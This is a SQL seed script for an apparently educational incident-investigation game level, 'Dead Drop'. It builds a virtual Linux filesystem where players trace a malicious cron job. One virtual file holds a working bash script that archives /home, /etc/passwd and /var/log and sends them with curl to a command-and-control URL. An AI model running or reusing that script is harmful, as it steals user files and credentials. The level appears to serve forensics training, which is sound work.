-- =============================================================================
-- LEVEL: "Dead Drop"
-- Type:       script_exec
-- Difficulty: easy
-- Description:
--   A cron job executed an unknown script at 3:14 AM. The script has since been
--   deleted but left behind artifacts — a modified crontab, a suspicious process
--   in process logs, a dropped payload in /tmp, and an outbound connection record.
--   The player must trace the execution chain from the cron trigger all the way
--   to the exfiltration event.
--
-- Investigation path:
--   1. ls /etc/cron.d             → find cron job files
--   2. cat /etc/cron.d/updater    → read the malicious cron entry
--   3. cat /var/log/syslog        → trace script execution in system log
--   4. find /tmp                  → discover dropped payload
--   5. cat /tmp/.cache/sync.sh    → read the malicious script content (HIDDEN, revealed step 4)
--   6. cat /var/log/net.log       → confirm outbound exfil connection (HIDDEN, revealed step 3)
--
-- Objectives: 5 visible + 1 secret
-- Weights: 15 + 15 + 20 + 20 + 15 + 15 = 100
-- =============================================================================


-- =============================================================================
-- STEP 1: INSERT SCENARIO
-- =============================================================================

INSERT INTO scenarios (title, type, difficulty, mission_brief, is_active, scenario_order)
VALUES (
    'Dead Drop',
    'script_exec',
    'easy',
    E'Automated threat monitoring flagged an anomalous cron execution at 03:14 AM. The triggered script is no longer present on disk — but it left footprints. A modified scheduler entry, a process trace in the system log, a staged payload buried in a temp directory, and a suspicious outbound connection were all captured before log rotation. Your mission: reconstruct the full execution chain. Find what ran, what it dropped, and where it called home.',
    TRUE,
    (SELECT COALESCE(MAX(scenario_order), 0) + 1 FROM scenarios)
);


-- =============================================================================
-- STEP 2: INSERT VIRTUAL FILES
-- =============================================================================
-- File system layout:
--   /
--   ├── etc/
--   │   ├── cron.d/
--   │   │   ├── updater          ← visible — malicious cron entry
--   │   │   └── system-check     ← visible — decoy legitimate cron entry
--   │   └── hostname             ← visible — machine identity
--   ├── var/
--   │   └── log/
--   │       ├── syslog           ← visible — script execution trace
--   │       └── net.log          ← HIDDEN, revealed at step 3 (syslog)
--   └── tmp/
--       ├── .cache/
--       │   └── sync.sh          ← HIDDEN, revealed at step 4 (find /tmp)
--       └── sync.pid             ← visible — process ID leftover
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO virtual_files (scenario_id, file_name, file_path, content, file_type, is_hidden, reveal_at_step)
VALUES

-- /etc directory
(
    (SELECT scenario_id FROM s),
    'etc',
    '/etc',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /etc/cron.d directory
(
    (SELECT scenario_id FROM s),
    'cron.d',
    '/etc/cron.d',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /etc/cron.d/updater — the malicious cron entry
(
    (SELECT scenario_id FROM s),
    'updater',
    '/etc/cron.d/updater',
    '# Added by system-updater v2
# DO NOT EDIT

14 3 * * * root /tmp/.cache/sync.sh > /dev/null 2>&1',
    'text',
    FALSE,
    NULL
),

-- /etc/cron.d/system-check — legitimate-looking decoy
(
    (SELECT scenario_id FROM s),
    'system-check',
    '/etc/cron.d/system-check',
    '# System health check — installed by sysadmin
# Runs every 6 hours

0 */6 * * * root /usr/local/bin/healthcheck.sh',
    'text',
    FALSE,
    NULL
),

-- /etc/hostname — machine identity
(
    (SELECT scenario_id FROM s),
    'hostname',
    '/etc/hostname',
    'prod-internal-01',
    'text',
    FALSE,
    NULL
),

-- /var directory
(
    (SELECT scenario_id FROM s),
    'var',
    '/var',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /var/log directory
(
    (SELECT scenario_id FROM s),
    'log',
    '/var/log',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /var/log/syslog — shows cron executing the script
(
    (SELECT scenario_id FROM s),
    'syslog',
    '/var/log/syslog',
    'Apr 19 03:00:01 prod-internal-01 CRON[3847]: (root) CMD (/usr/local/bin/healthcheck.sh)
Apr 19 03:00:03 prod-internal-01 systemd[1]: Started Session 42 of user root.
Apr 19 03:13:51 prod-internal-01 systemd[1]: Starting Daily log rotation...
Apr 19 03:14:00 prod-internal-01 CRON[4021]: (root) CMD (/tmp/.cache/sync.sh > /dev/null 2>&1)
Apr 19 03:14:01 prod-internal-01 kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=45.33.32.156 LEN=52 PROTO=TCP DPT=443
Apr 19 03:14:03 prod-internal-01 sync.sh[4022]: [*] Collecting target data...
Apr 19 03:14:07 prod-internal-01 sync.sh[4022]: [*] Archive written to /tmp/.cache/out.tar.gz
Apr 19 03:14:09 prod-internal-01 sync.sh[4022]: [+] Transfer complete. Bytes sent: 48221
Apr 19 03:14:10 prod-internal-01 CRON[4021]: (root) END (/tmp/.cache/sync.sh)
Apr 19 03:15:01 prod-internal-01 CRON[4105]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
Apr 19 03:20:00 prod-internal-01 systemd[1]: Reached target Multi-User System.',
    'text',
    FALSE,
    NULL
),

-- /var/log/net.log — HIDDEN, revealed when player reads syslog (step 3)
(
    (SELECT scenario_id FROM s),
    'net.log',
    '/var/log/net.log',
    '=== NETWORK CONNECTION LOG — prod-internal-01 ===
Captured: Apr 19 03:10:00 – 03:20:00

[03:13:58] ESTABLISHED  TCP  10.0.0.5:51204  →  45.33.32.156:443   (UNKNOWN HOST)
[03:14:01] SENT         TLS ClientHello      SNI: updates.delivery-cdn.net
[03:14:02] RECV         TLS ServerHello      CERT: CN=delivery-cdn.net  ISSUER: Let''s Encrypt
[03:14:09] SENT         HTTP POST /upload    Size: 48221 bytes
[03:14:10] CLOSED       TCP  10.0.0.5:51204  →  45.33.32.156:443

VERDICT: Non-whitelisted external IP. No matching outbound policy.
THREAT INTEL: 45.33.32.156 flagged in abuse DB — category: C2/exfiltration endpoint.',
    'text',
    TRUE,
    3   -- revealed when player reads /var/log/syslog
),

-- /tmp directory
(
    (SELECT scenario_id FROM s),
    'tmp',
    '/tmp',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /tmp/.cache directory — hidden parent for the payload
(
    (SELECT scenario_id FROM s),
    '.cache',
    '/tmp/.cache',
    NULL,
    'directory',
    FALSE,
    NULL
),

-- /tmp/sync.pid — leftover process ID file, visible from start
(
    (SELECT scenario_id FROM s),
    'sync.pid',
    '/tmp/sync.pid',
    '4022',
    'text',
    FALSE,
    NULL
),

-- /tmp/.cache/sync.sh — HIDDEN, revealed when player runs find /tmp (step 4)
(
    (SELECT scenario_id FROM s),
    'sync.sh',
    '/tmp/.cache/sync.sh',
    '#!/bin/bash
# system-updater sync module
# v2.1.4 — do not modify

TARGET_DIR="/home /etc/passwd /var/log"
STAGING="/tmp/.cache/out.tar.gz"
C2="https://updates.delivery-cdn.net/upload"

# Stage archive
tar czf "$STAGING" $TARGET_DIR 2>/dev/null

# Exfiltrate
curl -s -X POST "$C2" \
  -H "X-Client-ID: prod-internal-01" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@$STAGING"

# Cleanup
rm -f "$STAGING"
exit 0',
    'text',
    TRUE,
    4   -- revealed when player runs find /tmp
);


-- =============================================================================
-- STEP 3: INSERT EXPECTED STEPS
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO expected_steps (scenario_id, step_order, command_expected, target_path, weight_percent, description)
VALUES
(
    (SELECT scenario_id FROM s),
    1,
    'ls',
    '/etc/cron.d',
    15,
    'Listed the cron.d directory — identified scheduled job files including the suspicious updater entry'
),
(
    (SELECT scenario_id FROM s),
    2,
    'cat',
    '/etc/cron.d/updater',
    15,
    'Read the malicious cron entry — confirmed script path /tmp/.cache/sync.sh scheduled at 03:14'
),
(
    (SELECT scenario_id FROM s),
    3,
    'cat',
    '/var/log/syslog',
    20,
    'Read the system log — traced cron execution event and outbound network connection at 03:14'
),
(
    (SELECT scenario_id FROM s),
    4,
    'find',
    '/tmp',
    20,
    'Searched /tmp for hidden files — discovered the .cache directory containing the payload'
),
(
    (SELECT scenario_id FROM s),
    5,
    'cat',
    '/tmp/.cache/sync.sh',
    15,
    'Read the malicious script — revealed collection targets, C2 endpoint, and exfiltration method'
),
(
    (SELECT scenario_id FROM s),
    6,
    'cat',
    '/var/log/net.log',
    15,
    'Read the network log — confirmed TLS connection to flagged C2 host and 48221 bytes exfiltrated'
);


-- =============================================================================
-- STEP 4: INSERT OBJECTIVES
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO objectives (scenario_id, title, description, is_secret, trigger_step, xp_reward, objective_order)
VALUES

-- Objective 1: Find the scheduler (triggered at step 1)
(
    (SELECT scenario_id FROM s),
    'LOCATE_CRON_ENTRY',
    'Inspect the cron.d directory and identify all scheduled jobs on the system.',
    FALSE,
    1,
    0,
    1
),

-- Objective 2: Read the cron entry (triggered at step 2)
(
    (SELECT scenario_id FROM s),
    'READ_MALICIOUS_CRON',
    'Open the suspicious cron entry and extract the scheduled script path and execution time.',
    FALSE,
    2,
    0,
    2
),

-- Objective 3: Trace the execution (triggered at step 3)
(
    (SELECT scenario_id FROM s),
    'TRACE_EXECUTION_IN_SYSLOG',
    'Confirm the script execution event in the system log and identify associated network activity.',
    FALSE,
    3,
    0,
    3
),

-- Objective 4: Find the payload (triggered at step 4)
(
    (SELECT scenario_id FROM s),
    'DISCOVER_DROPPED_PAYLOAD',
    'Search the /tmp directory for hidden files or directories left behind by the script.',
    FALSE,
    4,
    0,
    4
),

-- Objective 5: Read the script (triggered at step 5)
(
    (SELECT scenario_id FROM s),
    'ANALYZE_SCRIPT_CONTENTS',
    'Read the malicious script and identify what data it collected and where it sent it.',
    FALSE,
    5,
    0,
    5
),

-- Objective 6 (SECRET): Confirm exfil via net log (triggered at step 6)
-- Hidden until player discovers /var/log/net.log via syslog
(
    (SELECT scenario_id FROM s),
    'CONFIRM_EXFIL_CONNECTION',
    'Cross-reference the network log to verify the C2 endpoint and bytes transferred. [CLASSIFIED]',
    TRUE,
    6,
    150,
    6
);


-- =============================================================================
-- VERIFICATION QUERIES
-- =============================================================================

-- Confirm scenario inserted
SELECT scenario_id, title, type, difficulty, is_active
FROM scenarios
WHERE title = 'Dead Drop';

-- Confirm all files (12 total: 6 dirs + 6 files)
SELECT virtual_file_id, file_name, file_path, file_type, is_hidden, reveal_at_step
FROM virtual_files
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY file_path;

-- Confirm 6 steps, weights sum to 100
SELECT step_order, command_expected, target_path, weight_percent, description
FROM expected_steps
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY step_order;

-- Confirm 6 objectives (5 visible, 1 secret)
SELECT objective_id, title, is_secret, trigger_step, xp_reward, objective_order
FROM objectives
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
)
ORDER BY objective_order;

-- Confirm weights total 100
SELECT SUM(weight_percent) AS total_weight
FROM expected_steps
WHERE scenario_id = (
    SELECT scenario_id FROM scenarios WHERE title = 'Dead Drop' ORDER BY created_at DESC LIMIT 1
);